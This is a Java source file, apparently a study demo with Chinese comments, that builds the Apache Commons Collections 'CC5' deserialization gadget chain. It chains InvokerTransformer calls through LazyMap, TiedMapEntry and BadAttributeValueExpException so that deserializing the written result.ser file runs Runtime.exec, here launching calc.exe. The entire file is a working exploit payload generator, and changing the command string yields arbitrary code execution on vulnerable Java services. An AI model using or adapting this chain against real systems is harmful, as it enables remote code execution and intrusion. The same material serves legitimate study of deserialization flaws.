package org.example.cc;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;



public class cc5Demo1 {
    public static void main(String[] args) throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
        String cmd = "calc.exe";
        // CC1的下半段链。
        ChainedTransformer chain = new ChainedTransformer(new Transformer[] {new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),
                new InvokerTransformer("exec",new Class[] { String.class }, new Object[]{cmd})});
        HashMap innermap = new HashMap();
        LazyMap map = (LazyMap)LazyMap.decorate(innermap,chain);
        // TiedMapEntry的toString方法中调用了this.map.get()。
        TiedMapEntry tiedmap = new TiedMapEntry(map,123);
        // BadAttributeValueExpException的readObject的方法中。间接调用了val.toString方法。
        BadAttributeValueExpException poc = new BadAttributeValueExpException(1);
        Field val = Class.forName("javax.management.BadAttributeValueExpException").getDeclaredField("val");
        val.setAccessible(true);
        val.set(poc,tiedmap);

        try{
            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("result.ser"));
            outputStream.writeObject(poc);
            outputStream.close();

            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("result.ser"));
            inputStream.readObject();
        }catch(Exception e){
            e.printStackTrace();
        }
    }
}

